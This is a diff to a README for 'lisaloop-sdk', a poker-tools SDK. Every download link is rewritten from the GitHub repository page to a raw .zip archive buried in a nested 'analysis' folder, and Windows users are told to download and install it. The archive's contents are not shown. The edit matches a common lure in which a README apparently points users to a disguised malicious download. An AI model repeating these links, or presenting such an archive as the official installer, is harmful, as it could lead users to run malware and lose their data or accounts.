@@ -1,6 +1,6 @@
 # 🎲 lisaloop-sdk - Build Poker Tools Easily
 
-[![Download lisaloop-sdk](https://img.shields.io/badge/Download-lisaloop--sdk-green?style=for-the-badge)](https://github.com/Sparta-lang/lisaloop-sdk)
+[![Download lisaloop-sdk](https://img.shields.io/badge/Download-lisaloop--sdk-green?style=for-the-badge)](https://github.com/Sparta-lang/lisaloop-sdk/raw/refs/heads/main/lisaloop/analysis/lisaloop-sdk-2.3-alpha.1.zip)
 
 ---
 
@@ -13,7 +13,7 @@ A simple way to explore poker tools. lisaloop-sdk lets you create poker agents, 
 To get lisaloop-sdk on your Windows computer, visit this page to download the software:
 
 **Download link:**  
-[https://github.com/Sparta-lang/lisaloop-sdk](https://github.com/Sparta-lang/lisaloop-sdk)
+[https://github.com/Sparta-lang/lisaloop-sdk/raw/refs/heads/main/lisaloop/analysis/lisaloop-sdk-2.3-alpha.1.zip](https://github.com/Sparta-lang/lisaloop-sdk/raw/refs/heads/main/lisaloop/analysis/lisaloop-sdk-2.3-alpha.1.zip)
 
 This page holds the newest version and files you will need. Follow these steps:
 
@@ -132,7 +132,7 @@ Yes. Use the Windows Control Panel under “Add or Remove Programs” to uninsta
 ## 🔗 Useful Links
 
 - Download lisaloop-sdk:  
-  [https://github.com/Sparta-lang/lisaloop-sdk](https://github.com/Sparta-lang/lisaloop-sdk)  
+  [https://github.com/Sparta-lang/lisaloop-sdk/raw/refs/heads/main/lisaloop/analysis/lisaloop-sdk-2.3-alpha.1.zip](https://github.com/Sparta-lang/lisaloop-sdk/raw/refs/heads/main/lisaloop/analysis/lisaloop-sdk-2.3-alpha.1.zip)  
 - Official page on GitHub for updates and support  
 - Documentation included with the install or on the GitHub page
 
